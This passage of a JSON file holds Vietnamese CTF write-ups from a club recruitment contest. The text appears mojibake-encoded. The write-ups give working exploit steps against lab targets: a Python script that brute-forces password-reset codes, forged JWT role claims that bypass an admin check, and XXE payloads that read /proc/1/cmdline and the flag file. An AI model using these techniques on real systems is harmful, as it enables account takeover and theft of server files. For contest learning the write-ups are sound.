tr·ªã trong ƒëo·∫°n [0, 1])_\r\n\r\n  - **N**: c√°c s·ªë t·ª´ 10 ƒë·∫øn 100\r\n\r\n  -> C√≥ t·ªïng c·ªông **6 \\* 90 = 540** tr∆∞·ªùng h·ª£p\r\n\r\nT·ªïng h·ª£p t·∫•t c·∫£ c√°c d·ªØ ki·ªán tr√™n m√¨nh c√≥ k·ªãch b·∫£n khai th√°c nh∆∞ sau:\r\n\r\n- T·∫°o t√†i kho·∫£n v·ªõi email t√πy √Ω (kh√¥ng c√≥ ch·ªØ admin) ƒë·ªÉ n√≥ ƒë∆∞·ª£c l∆∞u tr√™n database\r\n\r\n- G·ª≠i m·ªôt post request t·ªõi endpoint `/resetpassword` v·ªõi `username` l√† **admin**, `email` l√† c√°i m√¨nh v·ª´a t·∫°o, `code_reset` v√† `passwordnew` ch∆∞a c·∫ßn ƒë·ªÉ c≈©ng ƒë∆∞·ª£c\r\n\r\n- Server th·∫•y `code_reset` tr·ªëng v√† ti·∫øn h√†nh t·∫°o m·ªôt c√°i ƒë∆°n gi·∫£n do email l√† c·ªßa m√¨nh v√† l∆∞u v√†o database\r\n\r\n- Sau ƒë√≥ m√¨nh brute `code_reset` v·ªõi c·∫•u tr√∫c ƒë√£ ph√¢n t√≠ch ·ªü tr√™n cho ƒë·∫øn khi n√≥ ch·∫•p nh·∫≠n th√¨ th√¥i\r\n\r\n- ƒêƒÉng nh·∫≠p b·∫±ng t√†i kho·∫£n **admin** v·ªõi password v·ª´a ƒë·ªïi v√† l·∫•y flag\r\n\r\n**Script brute code**\r\n\r\n```py\r\nimport requests\r\n\r\nURL = \"http://14.225.220.66:5018/resetpassword\"\r\npayload = {\r\n    \"username\": \"admin\",\r\n    \"email\": \"user@gmail.com\",\r\n    \"code_reset\": \"\",\r\n    \"passwordnew\": \"goku\"\r\n}\r\n\r\n# G·ª≠i m·ªôt request v·ªõi code_reset tr·ªëng ƒë·ªÉ t·∫°o code_reset tr∆∞·ªõc\r\nrequests.post(url=URL, json=payload)\r\n\r\nfor i in range(65, 65 + 6 + 1):\r\n    L = chr(i)\r\n    for N in range(10, 10 + 90 + 1):\r\n\r\n        code_reset = L + str(N) + L\r\n        payload['code_reset'] = code_reset\r\n\r\n        try:\r\n            response = requests.post(url=URL, json=payload, timeout=2)\r\n            print(f\"{code_reset} {response.status_code} {response.text}\")\r\n\r\n            if (response.status_code != 200):\r\n                continue\r\n\r\n            print(\"Success\")\r\n            exit()\r\n\r\n        except requests.exceptions.ConnectTimeout:\r\n            # Thi tho·∫£ng server b·ªã lag m√¨nh b·ªè qua code ƒë√≥\r\n            pass\r\n```\r\n\r\nCh·∫°y code ta ƒë∆∞·ª£c\r\n\r\n```\r\n...\r\nF74F 400 {\"error\":\"Invalid reset code\"}\r\nF75F 400 {\"error\":\"Invalid reset code\"}\r\nF76F 200 {\"success\":true,\"message\":\"Password reset successful! Please login with your new password.\"}\r\nSuccess\r\n```\r\n\r\nL√∫c n√†y ƒëƒÉng nh·∫≠p v√†o t√†i kho·∫£ng admin v·ªõi m·∫≠t kh·∫©u v·ª´a ƒë·ªïi s·∫Ω ƒë∆∞·ª£c m·ªôt giao di·ªán c√≥ n√∫t `Get Flag` ·ªü gi·ªØa. Nh·∫•n v√†o l√† s·∫Ω c√≥ flag\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Hoshino_Portal/gwegwe.png)\r\n\r\n**Flag**: `KCSC{Pr4ct1c3_M4k3s_P3rf3ct!_2a561747db90855b98ddeed0775fe64c}`\r\n",
        "tags": []
      },
      {
        "id": "Ka_Ce_Et_Ce",
        "slug": "ka_ce_et_ce",
        "title": "Ka C√™ √ât C√™",
        "category": "Web",
        "author": "nartgnourt",
        "points": 428,
        "difficulty": "Medium",
        "readTime": "8 min",
        "date": "15-12-2025",
        "description": "B·∫°n th·ª±c s·ª± mu·ªën tr·ªü th√†nh m·ªôt Web player trong c√¢u l·∫°c b·ªô KCSC? H√£y th·ª≠ ghi t√™n b·∫°n v√†o danh s√°ch.",
        "content": "\r\n# TL;DR\r\n\r\nChall l√† m·ªôt trang web cho th√¥ng tin c·ªßa clb KCSC trong ƒë√≥ c√≥ m·ª•c gi·ªõi thi·ªáu, th√†nh t√≠ch v√† t√™n c·ªßa c√°c th√†nh vi√™n chuy√™n m√¥n web exploit. M·ª•c ti√™u c·ªßa ta l√† l·∫•y quy·ªÅn admin ƒë·ªÉ c·∫≠p nh·∫≠p file **members.xml** ƒë·ªÉ t·ª´ ƒë√≥ khai th√°c l·ªó h·ªïng **XXE** v√† ƒë·ªçc flag\r\n\r\n# Initial reconnaissance\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Ka_Ce_Et_Ce/fewfwdf.png)\r\n\r\nL·ª•c l·ªçi kh·∫Øp n∆°i tr√™n web th√¨ m√¨nh c≈©ng kh√¥ng th·∫•y c√≥ g√¨ ƒë·∫∑c bi·ªát tr·ª´ trang `admin.php` b·ªã ch·∫∑n do kh√¥ng ph·∫£i admin\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Ka_Ce_Et_Ce/rtert.png)\r\n\r\nSau ƒë·∫•y m√¨nh ti·∫øp t·ª•c m√≤ ƒë·∫øn source code\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Ka_Ce_Et_Ce/g4rgreger.png)\r\n\r\n**Dockerfile**\r\n\r\n```Dockerfile\r\nFROM php:7.4-fpm-alpine\r\n\r\nCOPY flag.txt /flag.txt\r\n\r\nRUN apk add --no-cache --virtual .build-deps \\\r\n  autoconf \\\r\n  g++ \\\r\n  make && \\\r\n  apk del .build-deps\r\n\r\nENV ADMIN_PASSWORD=\"REDACTED\"\r\n\r\nCMD [\"sh\", \"-c\", \"mv /flag.txt /flag_REDACTED.txt && php-fpm && tail -f /dev/null\"]\r\n```\r\n\r\nD·ª±a v√†o file docker m√¨nh th·∫•y flag s·∫Ω c√≥ d·∫°ng `flag_cai_gi_gi_day.txt` v√† c√≥ l·∫Ω b√†i n√†y s·∫Ω l√† m·ªôt b√†i RCE ƒë·ªÉ ls xong r·ªìi m·ªõi ƒë·ªçc flag\r\n\r\nTh·ª© ƒë·∫ßu ti√™n ƒë·∫≠p v√†o m·∫Øt m√¨nh khi m·ªü source code l√† hai file `JWT.php` v√† `KCSC.php`\r\n\r\n**JWT.php**\r\n\r\n```php\r\n<?php\r\n\r\nclass JWT\r\n{\r\n    private static $secret = \"REDACTED\";\r\n\r\n    private static function base64UrlEncode($data)\r\n    {\r\n        return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');\r\n    }\r\n\r\n    private static function base64UrlDecode($data)\r\n    {\r\n        return base64_decode(strtr($data, '-_', '+/'));\r\n    }\r\n\r\n    public static function generateToken($payload, $expiresIn = 3600)\r\n    {\r\n        $header = [\r\n            'typ' => 'JWT',\r\n            'alg' => 'HS256'\r\n        ];\r\n\r\n        $payload['iat'] = time();\r\n        $payload['exp'] = time() + $expiresIn;\r\n\r\n        $headerEncoded = self::base64UrlEncode(json_encode($header));\r\n        $payloadEncoded = self::base64UrlEncode(json_encode($payload));\r\n\r\n        $signature = hash_hmac('sha256', \"$headerEncoded.$payloadEncoded\", self::$secret, true);\r\n        $signatureEncoded = self::base64UrlEncode($signature);\r\n\r\n        return \"$headerEncoded.$payloadEncoded.$signatureEncoded\";\r\n    }\r\n\r\n    public static function validateToken($token)\r\n    {\r\n        $parts = explode('.', $token);\r\n        if (count($parts) !== 3) {\r\n            return false;\r\n        }\r\n\r\n        list($headerEncoded, $payloadEncoded, $signatureEncoded) = $parts;\r\n\r\n        $signature = self::base64UrlDecode($signatureEncoded);\r\n        $expectedSignature = hash_hmac('sha256', \"$headerEncoded.$payloadEncoded\", self::$secret, true);\r\n\r\n        if (!hash_equals($signature, $expectedSignature)) {\r\n            return false;\r\n        }\r\n\r\n        $payload = json_decode(self::base64UrlDecode($payloadEncoded), true);\r\n\r\n        if (isset($payload['exp']) && $payload['exp'] < time()) {\r\n            return false;\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    public static function decodeToken($token)\r\n    {\r\n        $parts = explode('.', $token);\r\n        if (count($parts) !== 3) {\r\n            return null;\r\n        }\r\n\r\n        $payload = json_decode(self::base64UrlDecode($parts[1]), true);\r\n        return $payload;\r\n    }\r\n\r\n    public static function refreshToken($token, $expiresIn = 3600)\r\n    {\r\n        if (!self::validateToken($token)) {\r\n            throw new Exception('Invalid token');\r\n        }\r\n\r\n        $payload = self::decodeToken($token);\r\n        unset($payload['iat']);\r\n        unset($payload['exp']);\r\n\r\n        return self::generateToken($payload, $expiresIn);\r\n    }\r\n}\r\n```\r\n\r\n**KCSC.php**\r\n\r\n```php\r\n<?php\r\nrequire_once __DIR__ . '/JWT.php';\r\n\r\nclass KCSC\r\n{\r\n    public $members;\r\n\r\n    public function __construct($members = __DIR__ . '/../members.xml')\r\n    {\r\n        $this->members = $members;\r\n    }\r\n\r\n    public function slogan()\r\n    {\r\n        return 'Make KMA Greater';\r\n    }\r\n\r\n    public function info()\r\n    {\r\n        return \"https://www.facebook.com/kmasec.club\";\r\n    }\r\n\r\n    public function isAdmin($token)\r\n    {\r\n        if (!JWT::decodeToken($token)) {\r\n            return false;\r\n        } else {\r\n            $payload = JWT::decodeToken($token);\r\n            if ($payload['role'] !== 'admin') {\r\n                return false;\r\n            }\r\n            return true;\r\n        }\r\n    }\r\n\r\n    public function update_members($xml_content)\r\n    {\r\n        libxml_use_internal_errors(true);\r\n\r\n        $dom = new DOMDocument();\r\n        $loaded = $dom->loadXML($xml_content, LIBXML_DTDLOAD | LIBXML_NOENT);\r\n\r\n        if (!$loaded) {\r\n            $errors = libxml_get_errors();\r\n            libxml_clear_errors();\r\n            return ['success' => false, 'message' => 'Invalid XML format: ' . $errors[0]->message];\r\n        }\r\n\r\n        $adminNodes = $dom->getElementsByTagName('admin');\r\n\r\n        $admin = $adminNodes->item(0)->nodeValue;\r\n\r\n        if (file_put_contents($this->members, $xml_content)) {\r\n            return ['success' => true, 'message' => 'Admin ' . $admin . ' updated members.xml file'];\r\n        } else {\r\n            return ['success' => false, 'message' => 'Failed to write file'];\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nFile `JWT.php` sau khi ph√¢n t√≠ch c√≥ v·∫ª ch·ªâ l√† m·ªôt class t·∫°o token JWT b√¨nh th∆∞·ªùng v·ªõi thu·∫≠t to√°n **HS256**\r\n\r\nNh∆∞ng ƒëi·ªÉm ƒë·∫∑c bi·ªát l√† ·ªü ch·ªó file `KCSC.php` s·ª≠ d·ª•ng n√≥ c√≥ m·ªôt v·∫•n ƒë·ªÅ **nghi√™m tr·ªçng**\r\n\r\n```php\r\npublic function isAdmin($token)\r\n{\r\n    if (!JWT::decodeToken($token)) {\r\n        return false;\r\n    } else {\r\n        $payload = JWT::decodeToken($token);\r\n        if ($payload['role'] !== 'admin') {\r\n            return false;\r\n        }\r\n        return true;\r\n    }\r\n}\r\n```\r\n\r\nM·ª•c ƒë√≠ch c·ªßa h√†m n√†y c√≥ l·∫Ω l√† ƒë·ªÉ ki·ªÉm tra xem JWT token c·ªßa ng∆∞·ªùi ch∆°i c√≥ ph·∫£i l√† c·ªßa admin hay kh√¥ng\r\n\r\nTh·∫ø nh∆∞ng l·ªó h·ªïng c·ªßa h√†m n√†y l√† ·ªü ch·ªó n√≥ ch·ªâ ki·ªÉm tra hai th·ª©:\r\n\r\n- Token ƒë√≥ c√≥ ph·∫£i l√† m·ªôt JWT token h·ª£p l·ªá hay kh√¥ng\r\n\r\n- N·∫øu h·ª£p l·ªá th√¨ n·ªôi dung c·ªßa n√≥ c√≥ `role` l√† **admin** hay kh√¥ng\r\n\r\nƒêi·ªÅu ƒë√≥ d·∫´n ƒë·∫øn vi·ªác n·∫øu nh∆∞ b·∫•t k√¨ ng∆∞·ªùi n√†o c√≥ m·ªôt token JWT h·ª£p l·ªá th√¨ c≈©ng c√≥ th·ªÉ t√πy √Ω s·ª≠a ƒë·ªïi n√≥ m√† kh√¥ng c·∫ßn quan t√¢m xem secret key c√≥ kh·ªõp hay kh√¥ng\r\n\r\n---\r\n\r\nSau ƒë·∫•y m√¨nh ph√°t hi·ªán th√™m endpoint n√†y\r\n\r\n**/api/login.php**\r\n\r\n```php\r\n<?php\r\nrequire_once __DIR__ . '/../utils/JWT.php';\r\n\r\n$result = new stdClass;\r\n\r\nheader('Content-Type: application/json; charset=utf-8');\r\n\r\nif ($_SERVER['REQUEST_METHOD'] !== 'POST') {\r\n    http_response_code(400);\r\n    $result->message = \"Only POST!\";\r\n} else {\r\n    try {\r\n        $data = json_decode(file_get_contents('php://input'), true);\r\n        $username = $data['username'] ?? NULL;\r\n        $password = $data['password'] ?? NULL;\r\n\r\n        if ($username === NULL || $password === NULL) {\r\n            $result->message = 'Please provide your username and password!';\r\n        } else if ($username === 'admin' && $password === getenv('ADMIN_PASSWORD')) {\r\n            $result->message = 'Oh, Welcome admin!';\r\n            $result->token = JWT::generateToken(['username' => 'admin', 'role' => 'admin']);\r\n        } else {\r\n            $result->message = 'Hello, CTFer!';\r\n            $result->token = JWT::generateToken(['username' => $username, 'role' => 'ctfer']);\r\n        }\r\n    } catch (\\Throwable $th) {\r\n    }\r\n}\r\n\r\necho json_encode($result);\r\n```\r\n\r\nPh√¢n t√≠ch code m√¨nh th·∫•y n√≥ ho·∫°t ƒë·ªông nh∆∞ sau:\r\n\r\nKhi ta g·ª≠i m·ªôt post request ch·ª©a hai tham s·ªë l√† `$username` v√† `$password` t·ªõi endpoint n√†y th√¨ s·∫Ω c√≥ hai tr∆∞·ªùng h·ª£p x·∫£y ra\r\n\r\n- N·∫øu `$username` v√† `$password` tr√πng kh·ªõp v·ªõi th√¥ng tin c·ªßa admin th√¨ n√≥ s·∫Ω tr·∫£ v·ªÅ JWT token v·ªõi role l√† **admin**\r\n\r\n- C√≤n l·∫°i ta s·∫Ω nh·∫≠n ƒë∆∞·ª£c m·ªôt token v·ªõi role l√† **ctfer**\r\n\r\nV√† cu·ªëi c√πng ·ªü trong `admin.php`\r\n\r\n```php\r\n<?php\r\nrequire_once __DIR__ . '/utils/JWT.php';\r\nrequire_once __DIR__ . '/utils/KCSC.php';\r\n\r\n$token = $_COOKIE['token'] ?? null;\r\n$kcsc = new KCSC;\r\n\r\n...\r\n\r\n    <?php if ($kcsc->isAdmin($token)): ?>\r\n        <div class=\"editor-container\">\r\n            <div class=\"form-group\">\r\n                <label for=\"xml_content\">members.xml</label>\r\n                <textarea id=\"xml_content\"><?= htmlspecialchars($xml_content) ?></textarea>\r\n            </div>\r\n...\r\n```\r\n\r\nM√¨nh th·∫•y g·∫ßn nh∆∞ to√†n b·ªô n·ªôi dung c·ªßa `/admin.php` s·∫Ω ch·ªâ ƒë∆∞·ª£c hi·ªÉn th·ªã n·∫øu nh∆∞ h√†m `isAdmin($token)` tr·∫£ v·ªÅ gi√° tr·ªã **True**\r\n\r\n# Exploit and get flag\r\n\r\nT·ªïng h·ª£p l·∫°i nh·ªØng th√¥ng tin ƒë√£ ph√¢n t√≠ch n√£y gi·ªù, m√¨nh c√≥ k·ªãch b·∫£n ƒë·ªÉ truy c·∫≠p ƒë∆∞·ª£c `/admin.php` nh∆∞ sau:\r\n\r\n- G·ª≠i m·ªôt post request v·ªõi `username` v√† `password` b·∫•t k√¨ t·ªõi `/api/login.php`\r\n\r\n- Nh·∫≠n ƒë∆∞·ª£c m·ªôt **token JWT h·ª£p l·ªá** th√¨ ti·∫øn h√†nh l√™n [jwt.io](https://www.jwt.io/) ƒë·ªÉ ch·ªânh s·ª≠a role th√†nh **admin**\r\n\r\n- Truy c·∫≠p v√†o `/admin.php` v·ªõi token v·ª´a ƒë∆∞·ª£c ch·ªânh s·ª≠a\r\n\r\n---\r\n\r\nƒê·∫ßu ti√™n ta l·∫•y m·ªôt token h·ª£p l·ªá tr∆∞·ªõc\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Ka_Ce_Et_Ce/w4twrg.png)\r\n\r\n`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiY3RmZXIiLCJpYXQiOjE3NjU3NTM2OTcsImV4cCI6MTc2NTc1NzI5N30.QHSxQa8sJIASQpCs8y5925InBi_iDjpemqRJbHlgL-U`\r\n\r\nSau ƒë√≥ ti·∫øn h√†nh ch·ªânh s·ª≠a **role** th√†nh **admin**\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Ka_Ce_Et_Ce/rherherherh.png)\r\n\r\n`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjU3NTM2OTcsImV4cCI6MTc2NTc1NzI5N30.FEiq_nL1TWznIxDAUgC-YINd-7SfUbbid9FbWYx9G_Q`\r\n\r\nCu·ªëi c√πng l√† d√πng n√≥ ƒë·ªÉ truy c·∫≠p `/admin.php`\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Ka_Ce_Et_Ce/ww4t4t.png)\r\n\r\n---\r\n\r\nGiao di·ªán cho ta edit m·ªôt file **xml** m√† sau khi so s√°nh v·ªõi `members.xml` trong ph·∫ßn source code th√¨ c·∫£ hai ƒë·ªÅu gi·ªëng nh∆∞ nhau\r\n\r\nƒê·∫øn ƒë√¢y m√¨nh nghƒ© ngay t·ªõi vi·ªác khai th√°c l·ªó h·ªïng **XXE** ƒë·ªÉ ƒë·ªçc ƒë∆∞·ª£c flag ·ªü tr√™n server\r\n\r\nQuay l·∫°i file **Docker**:\r\n\r\n```DOCKER\r\n...\r\nCMD [\"sh\", \"-c\", \"mv /flag.txt /flag_REDACTED.txt && php-fpm && tail -f /dev/null\"]\r\n```\r\n\r\nFlag m·ªõi ƒë·∫ßu s·∫Ω ƒë∆∞·ª£c ƒë·ªïi t√™n th√™m m·ªôt d√£y k√≠ t·ª± ng·∫´u nhi√™n ·ªü ƒë·∫±ng sau n√™n m√¨nh kh√¥ng th·ªÉ ƒëo√°n ƒë∆∞·ª£c\r\n\r\nThay v√†o ƒë√≥ m√¨nh t√¨m c√°ch ƒë·ªçc c√¢u l·ªánh ƒë√≥ ƒë·ªÉ xem n√≥ ƒë·ªïi th√†nh c√°i g√¨ lu√¥n\r\n\r\nTa ti·∫øn h√†nh s·ª≠a file **xml** tr√™n nh∆∞ sau:\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/proc/1/cmdline\">]>\r\n<kcsc>\r\n\t<members>\r\n    <member>\r\n      <username>&xxe;</username>\r\n      <role>Web</role>\r\n    </member>\r\n  </members>\r\n</kcsc>\r\n```\r\n\r\nC·ª• th·ªÉ m·ª•c ƒë√≠ch c·ªßa m√¨nh l√† ƒë·ªçc n·ªôi dung c·ªßa `/proc/1/cmdline` (ch·ª©a l·ªánh ƒë·ªïi t√™n file flag), encode n√≥ b·∫±ng base64 qua php wrapper r·ªìi hi·ªÉn th·ªã n√≥ trong th·∫ª `username`\r\n\r\nƒê·∫øn ƒë√¢y m√¨nh c·ª© t∆∞·ªüng l√† ch·ªâ c·∫ßn v√†o `/members.php` ƒë·ªÉ n√≥ render l√† m√¨nh s·∫Ω nh·∫≠n ƒë∆∞·ª£c n·ªôi dung c·ªßa n√≥ nh∆∞ng l·∫°i kh√¥ng nh·∫≠n ƒë∆∞·ª£c g√¨ c·∫£\r\n\r\nSau ƒë·∫•y m√¨nh c√≥ th·ª≠ v·ªõi c√°c file kh√°c nh∆∞ng c≈©ng kh√¥ng nh·∫≠n l·∫°i ƒë∆∞·ª£c g√¨ kh·∫£ quan\r\n\r\nNg·ªìi m·∫•t m·ªôt h·ªìi l√¢u m√¨nh quy·∫øt ƒë·ªãnh l·ª•c ti·∫øp source xem c√≥ g√¨ m√¨nh c√≤n b·ªè s√≥t n·ªØa kh√¥ng th√¨ m√¨nh th·∫•y vi·ªác c·∫≠p nh·∫≠p file `members.xml` s·∫Ω ƒë∆∞·ª£c di·ªÖn ra nh∆∞ sau\r\n\r\n- `admin.php` g·ª≠i request t·ªõi endpoint `/api/members/update.php`\r\n\r\n  - ```php\r\n      async function saveChanges() {\r\n          const content = editor.getValue();\r\n          const btn = document.querySelector('.btn-save');\r\n\r\n          btn.disabled = true;\r\n          btn.textContent = 'Saving...';\r\n\r\n          try {\r\n              const res = await fetch('/api/members/update.php', {\r\n                  method: 'POST',\r\n                  headers: {\r\n                      'Content-Type': 'application/json'\r\n                  },\r\n                  body: JSON.stringify({\r\n                      xml_content: content\r\n                  })\r\n              });\r\n      ...\r\n    ```\r\n\r\n- `update.php` ti·∫øp t·ª•c ki·ªÉm tra token c·ªßa ng∆∞·ªùi ch∆°i th√¥ng qua `kcsc->isAdmin($token)` r·ªìi g·ªçi t·ªõi `$kcsc->update_members($xml_content)`\r\n\r\n  - ```php\r\n      if ($_SERVER['REQUEST_METHOD'] !== 'POST') {\r\n          http_response_code(400);\r\n          $result->message = 'Only POST request!';\r\n      } else {\r\n          $token = $_COOKIE['token'] ?? null;\r\n          if (is_null($token)) {\r\n              http_response_code(401);\r\n              $result->message = 'Please provide cookie token!';\r\n          } else if (!$kcsc->isAdmin($token)) {\r\n              http_response_code(403);\r\n              $result->message = 'You are not admin!';\r\n          } else {\r\n              $input = file_get_contents('php://input');\r\n              $data = json_decode($input, true);\r\n\r\n              if (!isset($data['xml_content'])) {\r\n                  http_response_code(400);\r\n                  $result->message = 'Missing xml_content parameter!';\r\n              } else {\r\n                  $xml_content = $data['xml_content'];\r\n                  $updateResult = $kcsc->update_members($xml_content);\r\n\r\n                  if ($updateResult['success']) {\r\n                      $result->message = $updateResult['message'];\r\n                  } else {\r\n                      http_response_code(400);\r\n                      $result->message = $updateResult['message'];\r\n                      if (isset($updateResult['errors'])) {\r\n                          $result->errors = $updateResult['errors'];\r\n                      }\r\n                  }\r\n              }\r\n          }\r\n      }\r\n    ```\r\n\r\n- H√†m `$kcsc->update_members($xml_content)` ki·ªÉm tra xem n·ªôi dung c·ªßa file **xml** m√¨nh g·ª≠i c√≥ h·ª£p l·ªá kh√¥ng, n·∫øu c√≥ th√¨ ti·∫øn h√†nh c·∫≠p nh·∫≠t v√†o file `members.xml`\r\n\r\nƒêi·ªÉm ƒë·∫∑c bi·ªát n·∫±m ·ªü trong h√†m `update_members`\r\n\r\n**KCSC.php**\r\n\r\n```php\r\npublic function update_members($xml_content)\r\n{\r\n    libxml_use_internal_errors(true);\r\n\r\n    $dom = new DOMDocument();\r\n    $loaded = $dom->loadXML($xml_content, LIBXML_DTDLOAD | LIBXML_NOENT);\r\n\r\n    if (!$loaded) {\r\n        $errors = libxml_get_errors();\r\n        libxml_clear_errors();\r\n        return ['success' => false, 'message' => 'Invalid XML format: ' . $errors[0]->message];\r\n    }\r\n\r\n    $adminNodes = $dom->getElementsByTagName('admin');\r\n\r\n    $admin = $adminNodes->item(0)->nodeValue;\r\n\r\n    if (file_put_contents($this->members, $xml_content)) {\r\n        return ['success' => true, 'message' => 'Admin ' . $admin . ' updated members.xml file'];\r\n    } else {\r\n        return ['success' => false, 'message' => 'Failed to write file'];\r\n    }\r\n}\r\n```\r\n\r\nBi·∫øn `$admin` s·∫Ω l·∫•y n·ªôi dung t·ª´ tag `admin` ·ªü trong file xml r·ªìi sau ƒë√≥ n·∫øu nh∆∞ m√† c·∫≠p nh·∫≠t file th√†nh c√¥ng th√¨ s·∫Ω tr·∫£ v·ªÅ response ch·ª©a n·ªôi dung ƒë√≥\r\n\r\n```php\r\nreturn ['success' => true, 'message' => 'Admin ' . $admin . ' updated members.xml file'];\r\n```\r\n\r\nDo ƒë√≥ m√¨nh th·ª≠ ch·ªânh s·ª≠a cho file xml sao cho ph·∫ßn n·ªôi dung file m√¨nh c·∫ßn ƒë·ªçc s·∫Ω n·∫±m trong tag `admin`\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/proc/1/cmdline\">]>\r\n\r\n<admin>&xxe;</admin>\r\n```\r\n\r\nQu·∫£ th·ª±c l√† m√¨nh ƒë√£ nh·∫≠n ƒë∆∞·ª£c n·ªôi dung file\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Ka_Ce_Et_Ce/4t34t344.png)\r\n\r\n```json\r\n{\r\n  \"message\": \"Admin c2gALWMAbXYgL2ZsYWcudHh0IC9mbGFnX2Y0NmVmOTQyNzQzMjI1ZjA5NDk5OWIyNmFmMzA4MGQwLnR4dCAmJiBwaHAtZnBtIC1EICYmIGh0dHBkIC1EIEZPUkVHUk9VTkQgJiYgdGFpbCAtZiAvZGV2L251bGwA updated members.xml file\"\r\n}\r\n```\r\n\r\nDecode ra ta ƒë∆∞·ª£c\r\n\r\n`sh-cmv /flag.txt /flag_f46ef942743225f094999b26af3080d0.txt && php-fpm -D && httpd -D FOREGROUND && tail -f /dev/null`\r\n\r\nVi·ªác c√≤n l·∫°i l√† ch·ªâ vi·ªác ƒë·ªçc `/flag_f46ef942743225f094999b26af3080d0.txt` l√† s·∫Ω c√≥ ƒë∆∞·ª£c flag\r\n\r\n**Payload**\r\n\r\n```php\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag_f46ef942743225f094999b26af3080d0.txt\">]>\r\n\r\n<admin>&xxe;</admin>\r\n```\r\n\r\n`S0NTQ3swaGhfdzQwMDAwX2NodWNfbXVuOV9iNG5fZDRfN3IwXzdoNG5oX20wN183aDRuaF92MTNuX2N1NF9rYzVjX25oMDAwMH0=`\r\n\r\n**Flag**: `KCSC{0hh_w40000_chuc_mun9_b4n_d4_7r0_7h4nh_m07_7h4nh_v13n_cu4_kc5c_nh0000}`\r\n",
        "tags": []
      },
      {
        "id": "Ka_Ce_Et_Ce_Revenge",
        "slug": "ka_ce_et_ce_revenge",
        "title": "Ka C√™ √ât C√™ Revenge",
        "category": "Web",
        "author": "nartgnourt",
        "points": 460,
        "difficulty": "Medium",
        "readTime": "2 min",
        "date": "15-12-2025",
        "description": "B·∫°n th·ª±c s·ª± mu·ªën tr·ªü th√†nh m·ªôt Web player trong c√¢u l·∫°c b·ªô KCSC? H√£y th·ª≠ ghi t√™n b·∫°n v√†o danh s√°ch m·ªôt l·∫ßn n·ªØa.",
        "content": "\r\n# TL;DR\r\n\r\nB√†i n√†y gi·ªëng v·ªõi b√†i b·∫£n th∆∞·ªùng ch·ªâ c√≥ ƒëi·ªÅu l√† ƒë√£ patch l·ªó h·ªïng trong h√†m `isAdmin` c·ªßa class `KCSC` khi·∫øn cho vi·ªác fake token l√† b·∫•t kh·∫£ thi\r\n\r\nM√¨nh th√†nh c√¥ng gi·∫£i ƒë∆∞·ª£c b√†i n√†y theo h∆∞·ªõng unintended b·∫±ng c√°ch l·∫•y secret m√† class JWT s·ª≠ d·ª•ng ƒë·ªÉ t·∫°o key **trong chall b·∫£n th∆∞·ªùng** do author qu√™n ƒë·ªÉ n√≥ l√† random :vv\r\n\r\nSau ƒë·∫•y m√¨nh t·∫°o token m·ªõi r·ªìi gi·∫£i y h·ªát b·∫£n th∆∞·ªùng l√† ra flag\r\n\r\nAuthor c√≥ hint h∆∞·ªõng intended l√† m√¨nh c·∫ßn t√¨m xem c√≤n ph·∫ßn n√†o c·ªßa web m√† m√¨nh ch∆∞a x√†i t·ªõi kh√¥ng nh∆∞ng ti·∫øc l√† m√¨nh v·∫´n ch∆∞a t√¨m ra :(\r\n\r\n# Exploit and get flag (Unintended)\r\n\r\n·ªû phi√™n b·∫£n n√†y t√°c gi·∫£ ƒë√° v√° h√†m `isAdmin` b·∫±ng c√°ch v·ª´a validate xem token c√≥ ph·∫£i l√† m·ªôt JWT token h·ª£p l·ªá kh√¥ng v·ª´a validate v·ªõi secret c·ªßa server\r\n\r\n```php\r\npublic function isAdmin($token)\r\n{\r\n    if (!JWT::decodeToken($token) || !JWT::validateToken($token)) {\r\n        return false;\r\n    } else {\r\n    $payload = JWT::decodeToken($token);\r\n    if ($payload['role'] !== 'admin') {\r\n        return false;\r\n    }\r\n    return true;\r\n    }\r\n}\r\n```\r\n\r\nƒêi·ªÅu n√†y khi·∫øn vi·ªác gi·∫£i nh∆∞ b√†i tr∆∞·ªõc l√† b·∫•t kh·∫£ thi do b∆∞·ªõc ƒë·∫ßu b·ªã ch·∫∑n v√¨ ta kh√¥ng th·ªÉ fake ƒë∆∞·ª£c token\r\n\r\nM√¨nh m·∫•t r·∫•t l√¢u ng·ªìi m√≤ source xem c√≤n c√°i g√¨ ƒë·ªÉ khai th√°c n·ªØa kh√¥ng th√¨ c≈©ng kh√¥ng t√¨m ƒë∆∞·ª£c g√¨ c·∫£\r\n\r\nC∆° m√† c√≥ m·ªôt th·ª© m√† m√¨nh kh√° ch√∫ √Ω ·ªü trong `JWT.php`\r\n\r\n```php\r\n<?php\r\n\r\nclass JWT\r\n{\r\n    private static $secret = \"REDACTED\";\r\n```\r\n\r\nSecret key c·ªßa c·∫£ hai phi√™n b·∫£n ƒë·ªÅu ƒë∆∞·ª£c hardcode v√†o trong source code n√™n m√¨nh nghƒ© bi·∫øt ƒë√¢u n·∫øu m√¨nh l·∫•y ƒë∆∞·ª£c secret key ·ªü chall b·∫£n th∆∞·ªùng th√¨ ƒë·∫øn b·∫£n n√†y m√¨nh v·∫´n d√πng l·∫°i 